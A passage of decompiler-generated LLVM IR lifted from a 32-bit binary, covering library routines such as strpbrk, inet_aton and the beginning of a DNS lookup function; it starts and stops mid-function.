  %v3_8056693 = icmp eq i8 %v2_8056693, 0
  %v1_8056696 = icmp eq i1 %v3_8056693, false
  br i1 %v1_8056696, label %dec_label_pc_805669e, label %dec_label_pc_8056698

dec_label_pc_8056698:                             ; preds = %dec_label_pc_8056685
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805669a = load i32, i32* @esi, align 4
  %v2_805669a = inttoptr i32 %v1_805669a to i32*
  store i32 %v2_8056691, i32* %v2_805669a, align 4
  %v0_80566c8.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80566c5

dec_label_pc_805669e:                             ; preds = %dec_label_pc_8056685
  %v0_805669e = load i32, i32* @edx, align 4
  %v0_80566a0 = load i32, i32* @edi, align 4
  %v8_80566a2 = call i32 @__GI_strpbrk(i8* %v1_8056693, i32 %v0_80566a0, i32 %v0_805669e, i32 %v0_805669e)
  store i32 %v8_80566a2, i32* %eax.global-to-local, align 4
  %v2_80566aa = icmp eq i32 %v8_80566a2, 0
  %v1_80566ac = icmp eq i1 %v2_80566aa, false
  br i1 %v1_80566ac, label %dec_label_pc_80566bd, label %dec_label_pc_80566ae

dec_label_pc_80566ae:                             ; preds = %dec_label_pc_805669e
  %v0_80566b2 = load i32, i32* @ebx, align 4
  %v5_80566b2 = inttoptr i32 %v0_80566b2 to i8*
  %v8_80566b3 = call i32 @rawmemchr(i8* %v5_80566b2, i32 0, i32 %v8_80566a2, i32 %v8_80566a2)
  br label %dec_label_pc_80566c1

dec_label_pc_80566bd:                             ; preds = %dec_label_pc_805669e
  %v9_80566a2 = inttoptr i32 %v8_80566a2 to i8*
  store i8 0, i8* %v9_80566a2, align 1
  %v2_80566c0 = add i32 %v8_80566a2, 1
  br label %dec_label_pc_80566c1

dec_label_pc_80566c1:                             ; preds = %dec_label_pc_80566ae, %dec_label_pc_80566bd
  %storemerge = phi i32 [ %v2_80566c0, %dec_label_pc_80566bd ], [ %v8_80566b3, %dec_label_pc_80566ae ]
  %v0_80566c1 = phi i32 [ %v2_80566c0, %dec_label_pc_80566bd ], [ %v8_80566b3, %dec_label_pc_80566ae ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_80566c1 = load i32, i32* @esi, align 4
  %v2_80566c1 = inttoptr i32 %v1_80566c1 to i32*
  store i32 %v0_80566c1, i32* %v2_80566c1, align 4
  %v0_80566c3 = load i32, i32* @ebx, align 4
  store i32 %v0_80566c3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80566c5

dec_label_pc_80566c5:                             ; preds = %dec_label_pc_8056698, %dec_label_pc_80566c1
  %v0_80566c8 = phi i32 [ %v0_80566c8.pre, %dec_label_pc_8056698 ], [ %v0_80566c3, %dec_label_pc_80566c1 ]
  %v2_80566c5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80566c5, i32* @ebx, align 4
  store i32 %v0_8056671, i32* @esi, align 4
  store i32 %v0_8056670, i32* @edi, align 4
  ret i32 %v0_80566c8

; uselistorder directives
  uselistorder i32 %v8_80566a2, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80566c5, { 1, 0 }
  uselistorder label %dec_label_pc_80566c1, { 1, 0 }
  uselistorder label %dec_label_pc_8056685, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_80566cd = load i32, i32* @ebx, align 4
  %v2_80566e425 = load i8, i8* %arg1, align 1
  %v4_80566e629 = icmp eq i8 %v2_80566e425, 0
  br i1 %v4_80566e629, label %dec_label_pc_80566ee, label %dec_label_pc_80566ea.lr.ph

dec_label_pc_80566ea.lr.ph:                       ; preds = %entry
  %v3_80566e426 = zext i8 %v2_80566e425 to i32
  %v5_80566e427 = and i32 %v0_80566cd, -256
  %v6_80566e428 = or i32 %v3_80566e426, %v5_80566e427
  %v4_80566d2 = ptrtoint i8* %arg1 to i32
  %v1_80566dd13 = inttoptr i32 %arg2 to i8*
  %v4_80566dd.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80566ea

dec_label_pc_80566d8:                             ; preds = %dec_label_pc_80566ea, %dec_label_pc_80566dc
  %v6_80566dd23 = phi i32 [ %v6_80566dd, %dec_label_pc_80566dc ], [ %v6_80566dd17, %dec_label_pc_80566ea ]
  %v2_80566dd22 = phi i8 [ %v2_80566dd, %dec_label_pc_80566dc ], [ %v2_80566dd14, %dec_label_pc_80566ea ]
  %v0_80566dc21 = phi i32 [ %v1_80566dc, %dec_label_pc_80566dc ], [ %arg2, %dec_label_pc_80566ea ]
  %v15_80566d8 = icmp eq i8 %v2_80566dd22, %v2_80566e433
  br i1 %v15_80566d8, label %dec_label_pc_80566f0, label %dec_label_pc_80566dc

dec_label_pc_80566dc:                             ; preds = %dec_label_pc_80566d8
  %v1_80566dc = add i32 %v0_80566dc21, 1
  store i32 %v1_80566dc, i32* @edx, align 4
  %v1_80566dd = inttoptr i32 %v1_80566dc to i8*
  %v2_80566dd = load i8, i8* %v1_80566dd, align 1
  %v3_80566dd = zext i8 %v2_80566dd to i32
  %v5_80566dd = and i32 %v6_80566dd23, -256
  %v6_80566dd = or i32 %v3_80566dd, %v5_80566dd
  store i32 %v6_80566dd, i32* @ecx, align 4
  %v4_80566df = icmp eq i8 %v2_80566dd, 0
  %v1_80566e1 = icmp eq i1 %v4_80566df, false
  br i1 %v1_80566e1, label %dec_label_pc_80566d8, label %dec_label_pc_80566e3

dec_label_pc_80566e3:                             ; preds = %dec_label_pc_80566dc, %dec_label_pc_80566ea
  %v4_80566dd.pre36 = phi i32 [ %v6_80566dd17, %dec_label_pc_80566ea ], [ %v6_80566dd, %dec_label_pc_80566dc ]
  %v1_80566e3 = add i32 %v0_80566e331, 1
  %v1_80566e4 = inttoptr i32 %v1_80566e3 to i8*
  %v2_80566e4 = load i8, i8* %v1_80566e4, align 1
  %v3_80566e4 = zext i8 %v2_80566e4 to i32
  %v5_80566e4 = and i32 %v6_80566e434, -256
  %v6_80566e4 = or i32 %v3_80566e4, %v5_80566e4
  %v4_80566e6 = icmp eq i8 %v2_80566e4, 0
  br i1 %v4_80566e6, label %dec_label_pc_80566ee, label %dec_label_pc_80566ea

dec_label_pc_80566ea:                             ; preds = %dec_label_pc_80566ea.lr.ph, %dec_label_pc_80566e3
  %v4_80566dd.pre = phi i32 [ %v4_80566dd.pre.pre, %dec_label_pc_80566ea.lr.ph ], [ %v4_80566dd.pre36, %dec_label_pc_80566e3 ]
  %v6_80566e434 = phi i32 [ %v6_80566e428, %dec_label_pc_80566ea.lr.ph ], [ %v6_80566e4, %dec_label_pc_80566e3 ]
  %v2_80566e433 = phi i8 [ %v2_80566e425, %dec_label_pc_80566ea.lr.ph ], [ %v2_80566e4, %dec_label_pc_80566e3 ]
  %v0_80566e331 = phi i32 [ %v4_80566d2, %dec_label_pc_80566ea.lr.ph ], [ %v1_80566e3, %dec_label_pc_80566e3 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_80566dd14 = load i8, i8* %v1_80566dd13, align 1
  %v3_80566dd15 = zext i8 %v2_80566dd14 to i32
  %v5_80566dd16 = and i32 %v4_80566dd.pre, -256
  %v6_80566dd17 = or i32 %v3_80566dd15, %v5_80566dd16
  store i32 %v6_80566dd17, i32* @ecx, align 4
  %v4_80566df18 = icmp eq i8 %v2_80566dd14, 0
  %v1_80566e120 = icmp eq i1 %v4_80566df18, false
  br i1 %v1_80566e120, label %dec_label_pc_80566d8, label %dec_label_pc_80566e3

dec_label_pc_80566ee:                             ; preds = %dec_label_pc_80566e3, %entry
  br label %dec_label_pc_80566f0

dec_label_pc_80566f0:                             ; preds = %dec_label_pc_80566d8, %dec_label_pc_80566ee
  %v0_80566f2 = phi i32 [ 0, %dec_label_pc_80566ee ], [ %v0_80566e331, %dec_label_pc_80566d8 ]
  store i32 %v0_80566cd, i32* @ebx, align 4
  ret i32 %v0_80566f2

; uselistorder directives
  uselistorder i32 %v6_80566dd17, { 2, 0, 1 }
  uselistorder i8 %v2_80566dd14, { 1, 2, 0 }
  uselistorder i32 %v1_80566e3, { 1, 0 }
  uselistorder i32 %v6_80566dd, { 1, 2, 0 }
  uselistorder i8 %v2_80566dd, { 1, 2, 0 }
  uselistorder i32 %v1_80566dc, { 2, 1, 0 }
  uselistorder i8 %v2_80566e425, { 0, 2, 1 }
  uselistorder i32 %v0_80566cd, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80566f0, { 1, 0 }
  uselistorder label %dec_label_pc_80566ea, { 1, 0 }
  uselistorder label %dec_label_pc_80566e3, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_80566fb = ptrtoint i8* %arg1 to i32
  store i32 %v4_80566fb, i32* @ecx, align 4
  %v1_80566ff = icmp eq i8* %arg1, null
  br i1 %v1_80566ff, label %dec_label_pc_8056780, label %dec_label_pc_8056703

dec_label_pc_8056703:                             ; preds = %entry
  %v0_805670e.pre = load i32, i32* @global_var_805e1e8, align 8
  br label %dec_label_pc_805670e

dec_label_pc_805670e:                             ; preds = %dec_label_pc_8056703, %dec_label_pc_8056757
  %v2_805675734 = phi i32 [ 1, %dec_label_pc_8056703 ], [ %v3_8056757, %dec_label_pc_8056757 ]
  %v0_805671433 = phi i32 [ %v4_80566fb, %dec_label_pc_8056703 ], [ %v0_80567143, %dec_label_pc_8056757 ]
  %v0_805677532 = phi i32 [ 0, %dec_label_pc_8056703 ], [ %v2_805675d, %dec_label_pc_8056757 ]
  %v1_8056714 = inttoptr i32 %v0_805671433 to i8*
  %v2_8056714 = load i8, i8* %v1_8056714, align 1
  %v3_8056714 = sext i8 %v2_8056714 to i32
  %v2_8056717 = mul nsw i32 %v3_8056714, 2
  %v3_8056717 = add i32 %v2_8056717, %v0_805670e.pre
  %v4_8056717 = inttoptr i32 %v3_8056717 to i8*
  %v5_8056717 = load i8, i8* %v4_8056717, align 1
  %v6_8056717 = and i8 %v5_8056717, 8
  %v7_8056717 = icmp eq i8 %v6_8056717, 0
  br i1 %v7_8056717, label %dec_label_pc_8056780, label %dec_label_pc_805671e

dec_label_pc_805671e:                             ; preds = %dec_label_pc_805670e
  %v4_8056732.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8056732

dec_label_pc_8056722:                             ; preds = %dec_label_pc_8056732
  %v3_8056722 = mul i32 %v1_8056722, 10
  %v2_8056725 = add i32 %v3_8056722, -48
  %v3_8056725 = add i32 %v2_8056725, %v2_8056734
  %v1_8056729 = add i32 %v3_8056725, -255
  %v6_8056729 = sub i32 254, %v3_8056725
  %v7_8056729 = and i32 %v6_8056729, %v3_8056725
  %v8_8056729 = icmp slt i32 %v7_8056729, 0
  %v9_8056729 = icmp eq i32 %v1_8056729, 0
  %v10_8056729 = icmp slt i32 %v1_8056729, 0
  %v3_805672f = icmp eq i1 %v10_8056729, %v8_8056729
  %v4_805672f = icmp eq i1 %v9_8056729, false
  %v5_805672f = and i1 %v4_805672f, %v3_805672f
  br i1 %v5_805672f, label %dec_label_pc_8056780, label %dec_label_pc_8056731

dec_label_pc_8056731:                             ; preds = %dec_label_pc_8056722
  %v1_8056731 = add i32 %v0_8056731, 1
  store i32 %v1_8056731, i32* @ecx, align 4
  br label %dec_label_pc_8056732

dec_label_pc_8056732:                             ; preds = %dec_label_pc_805671e, %dec_label_pc_8056731
  %v1_8056722 = phi i32 [ 0, %dec_label_pc_805671e ], [ %v3_8056725, %dec_label_pc_8056731 ]
  %v4_8056732 = phi i32 [ %v4_8056732.pre, %dec_label_pc_805671e ], [ %v6_8056732, %dec_label_pc_8056731 ]
  %v0_8056731 = phi i32 [ %v0_805671433, %dec_label_pc_805671e ], [ %v1_8056731, %dec_label_pc_8056731 ]
  %v1_8056732 = inttoptr i32 %v0_8056731 to i8*
  %v2_8056732 = load i8, i8* %v1_8056732, align 1
  %v3_8056732 = zext i8 %v2_8056732 to i32
  %v5_8056732 = and i32 %v4_8056732, -256
  %v6_8056732 = or i32 %v3_8056732, %v5_8056732
  store i32 %v6_8056732, i32* @edx, align 4
  %v2_8056734 = sext i8 %v2_8056732 to i32
  %v2_8056737 = mul nsw i32 %v2_8056734, 2
  %v3_8056737 = add i32 %v2_8056737, %v0_805670e.pre
  %v4_8056737 = inttoptr i32 %v3_8056737 to i16*
  %v5_8056737 = load i16, i16* %v4_8056737, align 2
  %v2_805673c = and i16 %v5_8056737, 8
  %v3_805673c = icmp eq i16 %v2_805673c, 0
  %v1_805673e = icmp eq i1 %v3_805673c, false
  br i1 %v1_805673e, label %dec_label_pc_8056722, label %dec_label_pc_8056740

dec_label_pc_8056740:                             ; preds = %dec_label_pc_8056732
  %v8_8056740 = sub nsw i32 2, %v2_805675734
  %v9_8056740 = and i32 %v8_8056740, %v2_805675734
  %v10_8056740 = icmp slt i32 %v9_8056740, 0
  %v11_8056740 = icmp eq i32 %v2_805675734, 3
  %v12_8056740 = icmp slt i32 %v2_805675734, 3
  %v3_8056744 = icmp eq i1 %v12_8056740, %v10_8056740
  %v4_8056744 = icmp eq i1 %v11_8056740, false
  %v5_8056744 = and i1 %v4_8056744, %v3_8056744
  br i1 %v5_8056744, label %dec_label_pc_805674e, label %dec_label_pc_8056746

dec_label_pc_8056746:                             ; preds = %dec_label_pc_8056740
  %v10_8056746 = icmp eq i8 %v2_8056732, 46
  %v1_8056749 = icmp eq i1 %v10_8056746, false
  br i1 %v1_8056749, label %dec_label_pc_8056780, label %dec_label_pc_805674b

dec_label_pc_805674b:                             ; preds = %dec_label_pc_8056746
  %v1_805674b = add i32 %v0_8056731, 1
  store i32 %v1_805674b, i32* @ecx, align 4
  br label %dec_label_pc_8056757

dec_label_pc_805674e:                             ; preds = %dec_label_pc_8056740
  %v1_805674e = add i32 %v0_8056731, 1
  store i32 %v1_805674e, i32* @ecx, align 4
  %v4_805674f = icmp eq i8 %v2_8056732, 0
  br i1 %v4_805674f, label %dec_label_pc_8056757, label %dec_label_pc_8056753

dec_label_pc_8056753:                             ; preds = %dec_label_pc_805674e
  %v2_8056753 = and i16 %v5_8056737, 32
  %v3_8056753 = icmp eq i16 %v2_8056753, 0
  br i1 %v3_8056753, label %dec_label_pc_8056780, label %dec_label_pc_8056757

dec_label_pc_8056757:                             ; preds = %dec_label_pc_8056753, %dec_label_pc_805674e, %dec_label_pc_805674b
  %v0_80567143 = phi i32 [ %v1_805674e, %dec_label_pc_8056753 ], [ %v1_805674e, %dec_label_pc_805674e ], [ %v1_805674b, %dec_label_pc_805674b ]
  %v3_8056757 = add nuw nsw i32 %v2_805675734, 1
  %v2_805675a = mul i32 %v0_805677532, 256
  %v2_805675d = or i32 %v1_8056722, %v2_805675a
  %v7_8056763 = icmp sgt i32 %v2_805675734, 3
  br i1 %v7_8056763, label %dec_label_pc_8056765, label %dec_label_pc_805670e

dec_label_pc_8056765:                             ; preds = %dec_label_pc_8056757
  %v4_8056765 = icmp eq i32 %arg2, 0
  br i1 %v4_8056765, label %dec_label_pc_8056782, label %dec_label_pc_8056771

dec_label_pc_8056771:                             ; preds = %dec_label_pc_8056765
  %v1_8056775 = call i32 @llvm.bswap.i32(i32 %v2_805675d)
  %v2_8056777 = inttoptr i32 %arg2 to i32*
  store i32 %v1_8056775, i32* %v2_8056777, align 4
  br label %dec_label_pc_8056782

dec_label_pc_8056780:                             ; preds = %dec_label_pc_8056753, %dec_label_pc_8056746, %dec_label_pc_805670e, %dec_label_pc_8056722, %entry
  br label %dec_label_pc_8056782

dec_label_pc_8056782:                             ; preds = %dec_label_pc_8056765, %dec_label_pc_8056771, %dec_label_pc_8056780
  %v0_8056787 = phi i32 [ 1, %dec_label_pc_8056765 ], [ 1, %dec_label_pc_8056771 ], [ 0, %dec_label_pc_8056780 ]
  ret i32 %v0_8056787

; uselistorder directives
  uselistorder i32 %v2_8056734, { 1, 0 }
  uselistorder i32 %v6_8056732, { 1, 0 }
  uselistorder i8 %v2_8056732, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8056731, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8056729, { 1, 0 }
  uselistorder i32 %v3_8056725, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805671433, { 1, 0 }
  uselistorder i32 %v2_805675734, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 3, 2, 1, 0 }
  uselistorder i32 -255, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8056782, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056780, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8056732, { 1, 0 }
  uselistorder label %dec_label_pc_805670e, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_805679e = call i32 @malloc(i32 512)
  store i32 %v2_805679e, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_805679e, i32* @ebp, align 4
  %v2_80567ac = call i32 @malloc(i32 1025)
  store i32 %v2_80567ac, i32* %eax.global-to-local, align 4
  %v12_80567b5 = ptrtoint i32* %stack_var_-236 to i32
  %v1_80567b8 = icmp eq i32 %v2_805679e, 0
  br i1 %v1_80567b8, label %dec_label_pc_8056e31, label %dec_label_pc_80567c0

dec_label_pc_80567c0:                             ; preds = %entry
  %v1_80567c0 = icmp eq i32 %v2_80567ac, 0
  br i1 %v1_80567c0, label %dec_label_pc_8056e31, label %dec_label_pc_80567c8

dec_label_pc_80567c8:                             ; preds = %dec_label_pc_80567c0
  %v5_80567c8 = icmp eq i32 %arg2, 0
  br i1 %v5_80567c8, label %dec_label_pc_8056e31, label %dec_label_pc_80567d6

dec_label_pc_80567d6:                             ; preds = %dec_label_pc_80567c8
  %v4_80567d6 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80567d6, i32* %eax.global-to-local, align 4
  %v2_80567dd = load i8, i8* %arg1, align 1
  %v3_80567dd = icmp eq i8 %v2_80567dd, 0
  br i1 %v3_80567dd, label %dec_label_pc_8056e31, label %dec_label_pc_80567e6

dec_label_pc_80567e6:                             ; preds = %dec_label_pc_80567d6
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_80567ea = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_80567ea, i32* @eax, align 4
  store i32 %v4_80567d6, i32* %edx.global-to-local, align 4
  %v2_805680d = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_805680d, i32* @ebx, align 4
  %tmp46 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_8056815 = call i32 @__pthread_return_void(i32 %v2_805680d, i32 134567263)
  store i32 %v3_8056815, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_80646e8.579 to i8*), i8** %stack_var_-252, align 4
  %v2_8056821 = call i32 @__pthread_return_0(i32 ptrtoint (i8** @global_var_80646e8.579 to i32))
  %v0_8056826 = load i64, i64* @global_var_8064700.580, align 8
  %v1_8056826 = trunc i64 %v0_8056826 to i32
  %v1_805682b = ashr i32 %v1_8056826, 31
  %v6_805682c = and i64 %v0_8056826, 4294967295
  %v8_805682c = zext i32 %v1_805682b to i64
  %v9_805682c = mul nuw i64 %v8_805682c, 4294967296
  %v10_805682c = or i64 %v9_805682c, %v6_805682c
  %v14_805682c = srem i64 %v10_805682c, %tmp33
  %v15_805682c = trunc i64 %v14_805682c to i32
  %v0_8056833 = load i16, i16* @global_var_805e444.581, align 4
  %v2_8056842 = load i8*, i8** %stack_var_-252, align 4
  %v3_8056842 = ptrtoint i8* %v2_8056842 to i32
  store i32 %v3_8056842, i32* @eax, align 4
  store i32 134567263, i32* %edx.global-to-local, align 4
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_8056847 = call i32 @__pthread_return_void(i32 %v2_805680d, i32 1)
  store i32 %v3_8056847, i32* %eax.global-to-local, align 4
  %v4_80569ee = inttoptr i32 %v15_805682c to i8*
  %v1_8056e0c72 = add i32 %v12_80567b5, 28
  %v2_8056e0c73 = inttoptr i32 %v1_8056e0c72 to i32*
  %v3_8056e0c74 = load i32, i32* %v2_8056e0c73, align 4
  %tmp = icmp ult i32 %v3_8056e0c74, 3
  br i1 %tmp, label %dec_label_pc_805686c, label %dec_label_pc_8056e31

dec_label_pc_805686c:                             ; preds = %dec_label_pc_80567e6, %dec_label_pc_8056e0c.backedge
  %v0_805687383 = phi i32 [ %v0_8056e0c.pre, %dec_label_pc_8056e0c.backedge ], [ %v12_80567b5, %dec_label_pc_80567e6 ]
  %v1_805686c = add i32 %v0_805687383, 20
  %v2_805686c = inttoptr i32 %v1_805686c to i32*
  %v3_805686c = load i32, i32* %v2_805686c, align 4
  %v13_805686c = icmp eq i32 %v3_805686c, -1
  br i1 %v13_805686c, label %dec_label_pc_805686c.dec_label_pc_8056882_crit_edge, label %dec_label_pc_8056873

dec_label_pc_805686c.dec_label_pc_8056882_crit_edge: ; preds = %dec_label_pc_805686c
  %v0_8056882.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056882

dec_label_pc_8056873:                             ; preds = %dec_label_pc_805686c
  %v3_8056876 = load i32, i32* %v2_805686c, align 4
  %v5_8056876 = add i32 %v0_805687383, -16
  %v6_8056876 = inttoptr i32 %v5_8056876 to i32*
  store i32 %v3_8056876, i32* %v6_8056876, align 4
  %v1_805687a = call i32 @__libc_close(i32 -1)
  store i32 %v1_805687a, i32* %eax.global-to-local, align 4
  %v0_805687f = load i32, i32* @esp, align 4
  %v1_805687f = add i32 %v0_805687f, 16
  br label %dec_label_pc_8056882

dec_label_pc_8056882:                             ; preds = %dec_label_pc_805686c.dec_label_pc_8056882_crit_edge, %dec_label_pc_8056873
  %v1_8056882 = phi i32 [ %v0_805687383, %dec_label_pc_805686c.dec_label_pc_8056882_crit_edge ], [ %v1_805687f, %dec_label_pc_8056873 ]
  %v0_8056882 = phi i32 [ %v0_8056882.pre, %dec_label_pc_805686c.dec_label_pc_8056882_crit_edge ], [ %v1_805687a, %dec_label_pc_8056873 ]
  %v2_8056882 = add i32 %v1_8056882, -4
  %v3_8056882 = inttoptr i32 %v2_8056882 to i32*
  store i32 %v0_8056882, i32* %v3_8056882, align 4
  %v1_8056883 = add i32 %v1_8056882, -8
  %v2_8056883 = inttoptr i32 %v1_8056883 to i32*
  store i32 512, i32* %v2_8056883, align 4
  %v1_8056888 = add i32 %v1_8056882, -12
  %v2_8056888 = inttoptr i32 %v1_8056888 to i32*
  store i32 0, i32* %v2_8056888, align 4
  %v2_805688a = add i32 %v1_8056882, -16
  %v3_805688a = inttoptr i32 %v2_805688a to i32*
  store i32 %v2_805679e, i32* %v3_805688a, align 4
  %v4_805688b = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_805682c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805688b, i32* %eax.global-to-local, align 4
  %v0_8056890 = load i32, i32* @esp, align 4
  %v1_8056893 = add i32 %v0_8056890, 8
  %v2_8056893 = inttoptr i32 %v1_8056893 to i32*
  store i32 48, i32* %v2_8056893, align 4
  %v1_8056895 = add i32 %v0_8056890, 4
  %v2_8056895 = inttoptr i32 %v1_8056895 to i32*
  store i32 0, i32* %v2_8056895, align 4
  %v1_8056897 = add i32 %v0_8056890, 84
  store i32 %v1_8056897, i32* @ebx, align 4
  %v3_805689b = inttoptr i32 %v0_8056890 to i32*
  store i32 %v1_8056897, i32* %v3_805689b, align 4
  %v4_805689c = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_805682c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805689c, i32* %eax.global-to-local, align 4
  %v0_80568a1 = load i32, i32* @esp, align 4
  %v1_80568a1 = add i32 %v0_80568a1, 72
  %v2_80568a1 = inttoptr i32 %v1_80568a1 to i32*
  %v3_80568a1 = load i32, i32* %v2_80568a1, align 4
  store i32 %v3_80568a1, i32* %eax.global-to-local, align 4
  %v1_80568a5 = add i32 %v0_80568a1, 116
  %v2_80568a5 = inttoptr i32 %v1_80568a5 to i32*
  store i32 1, i32* %v2_80568a5, align 4
  %v0_80568ad = load i32, i32* @esp, align 4
  %v1_80568ad = add i32 %v0_80568ad, 104
  %v2_80568ad = inttoptr i32 %v1_80568ad to i32*
  store i32 1, i32* %v2_80568ad, align 4
  %v0_80568b5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80568b5 = add i32 %v0_80568b5, 1
  %v1_80568b6 = urem i32 %v1_80568b5, 65536
  store i32 %v1_80568b6, i32* %eax.global-to-local, align 4
  %v1_80568bb = load i32, i32* @esp, align 4
  %v2_80568bb = add i32 %v1_80568bb, 72
  %v3_80568bb = inttoptr i32 %v2_80568bb to i32*
  store i32 %v1_80568b6, i32* %v3_80568bb, align 4
  %v0_80568bf = load i32, i32* %eax.global-to-local, align 4
  %v1_80568bf = load i32, i32* @esp, align 4
  %v2_80568bf = add i32 %v1_80568bf, 84
  %v3_80568bf = inttoptr i32 %v2_80568bf to i32*
  store i32 %v0_80568bf, i32* %v3_80568bf, align 4
  %v0_80568c3 = load i32, i32* @esp, align 4
  %v1_80568c6 = add i32 %v0_80568c3, 8
  %v2_80568c6 = inttoptr i32 %v1_80568c6 to i32*
  store i32 512, i32* %v2_80568c6, align 4
  %v2_80568cb = add i32 %v0_80568c3, 4
  %v3_80568cb = inttoptr i32 %v2_80568cb to i32*
  store i32 %v2_805679e, i32* %v3_80568cb, align 4
  %v0_80568cc = load i32, i32* @ebx, align 4
  %v3_80568cc = inttoptr i32 %v0_80568c3 to i32*
  store i32 %v0_80568cc, i32* %v3_80568cc, align 4
  %v0_80568cd = call i32 @__encode_header()
  store i32 %v0_80568cd, i32* %eax.global-to-local, align 4
  %v0_80568d2 = load i32, i32* @esp, align 4
  %v2_80568d5 = icmp slt i32 %v0_80568cd, 0
  store i32 %v0_80568cd, i32* @ebx, align 4
  br i1 %v2_80568d5, label %dec_label_pc_8056e31, label %dec_label_pc_80568df

dec_label_pc_80568df:                             ; preds = %dec_label_pc_8056882
  %v2_80568df = add i32 %v0_80568d2, 12
  %v3_80568df = inttoptr i32 %v2_80568df to i32*
  store i32 %v0_80568cd, i32* %v3_80568df, align 4
  %v1_80568e0 = add i32 %v0_80568d2, 8
  %v2_80568e0 = inttoptr i32 %v1_80568e0 to i32*
  store i32 1025, i32* %v2_80568e0, align 4
  %v1_80568e5 = add i32 %v0_80568d2, 256
  %v2_80568e5 = inttoptr i32 %v1_80568e5 to i32*
  %v3_80568e5 = load i32, i32* %v2_80568e5, align 4
  %v5_80568e5 = add i32 %v0_80568d2, 4
  %v6_80568e5 = inttoptr i32 %v5_80568e5 to i32*
  store i32 %v3_80568e5, i32* %v6_80568e5, align 4
  %v1_80568ec = add i32 %v0_80568d2, 28
  %v2_80568ec = inttoptr i32 %v1_80568ec to i32*
  %v3_80568ec = load i32, i32* %v2_80568ec, align 4
  %v6_80568ec = inttoptr i32 %v0_80568d2 to i32*
  store i32 %v3_80568ec, i32* %v6_80568ec, align 4
  %v4_80568f0 = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_805682c, i32 ptrtoint (i32* @0 to i32))
  %v0_80568f5 = load i32, i32* @esp, align 4
  %v1_80568f8 = add i32 %v0_80568f5, 8
  %v2_80568f8 = inttoptr i32 %v1_80568f8 to i32*
  store i32 ptrtoint (i32* @global_var_805e448.517 to i32), i32* %v2_80568f8, align 4
  %v1_80568fd = add i32 %v0_80568f5, 4
  %v2_80568fd = inttoptr i32 %v1_80568fd to i32*
  store i32 134567263, i32* %v2_80568fd, align 4
  %v1_8056902 = add i32 %v0_80568f5, 200
  store i32 %v1_8056902, i32* @eax, align 4
  %v3_8056909 = inttoptr i32 %v0_80568f5 to i32*
  store i32 %v1_8056902, i32* %v3_8056909, align 4
  %v2_805690a = call i32 @__pthread_return_void(i32 -1, i32 %v15_805682c)
  store i32 %v2_805690a, i32* %eax.global-to-local, align 4
  %v0_805690f = load i32, i32* @esp, align 4
  %v1_805690f = inttoptr i32 %v0_805690f to i32*
  store i32 ptrtoint (i32* @global_var_805e448.517 to i32), i32* %v1_805690f, align 4
  %v1_8056916 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8056916, i32* %eax.global-to-local, align 4
  %v0_805691b = load i32, i32* @esp, align 4
  %v1_805691b = add i32 %v0_805691b, 56
  %v2_805691b = inttoptr i32 %v1_805691b to i32*
  %v3_805691b = load i32, i32* %v2_805691b, align 4
  store i32 %v3_805691b, i32* %edx.global-to-local, align 4
  %v1_805691f = add i32 %v0_805691b, 268
  %v2_805691f = inttoptr i32 %v1_805691f to i32*
  %v3_805691f = load i32, i32* %v2_805691f, align 4
  store i32 %v3_805691f, i32* %eax.global-to-local, align 4
  %v2_8056926 = mul i32 %v3_805691b, 4
